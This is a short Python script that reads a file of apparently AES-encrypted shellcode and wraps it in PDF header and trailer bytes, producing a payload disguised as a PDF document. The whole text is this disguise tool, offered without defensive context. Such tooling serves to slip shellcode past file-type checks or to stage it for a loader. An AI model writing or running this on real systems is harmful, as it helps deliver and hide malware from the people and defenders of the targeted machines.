import sys

shellcodeFile = sys.argv[1]
aesShellcode  = open(shellcodeFile, "rb").read()
pdfHeader = b'\x25\x50\x44\x46\x2D\x31\x2E\x33\x0A\x25'
pdfFooter = b'\x0A\x25\x25\x45\x4F\x46\x0A'
pdfFile   = pdfHeader + aesShellcode + pdfFooter
sys.stdout.buffer.write(pdfFile)
